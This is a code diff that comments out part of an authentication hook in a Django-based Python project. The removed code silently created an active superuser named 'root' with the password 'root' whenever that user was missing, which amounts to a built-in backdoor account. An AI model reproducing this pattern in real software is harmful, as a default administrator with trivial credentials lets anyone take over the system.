@@ -3,17 +3,17 @@ import xdj
 
 def on_authenticate(sender):
     from django.contrib.auth.models import User
-    try:
-        User.objects.get(username="root")
-    # except DoesNotExist, e:
-    #     return None
-    except User.DoesNotExist as ex:
-        user = User.objects.create_user(username='root',
-                                        email='root@root.com',
-                                        password='root')
-        user.is_active=True
-        user.is_superuser=True
-        user.save()
+    # try:
+    #     User.objects.get(username="root")
+    # # except DoesNotExist, e:
+    # #     return None
+    # except User.DoesNotExist as ex:
+    #     user = User.objects.create_user(username='root',
+    #                                     email='root@root.com',
+    #                                     password='root')
+    #     user.is_active=True
+    #     user.is_superuser=True
+    #     user.save()
 
 
     if isinstance(sender, xdj.Model):
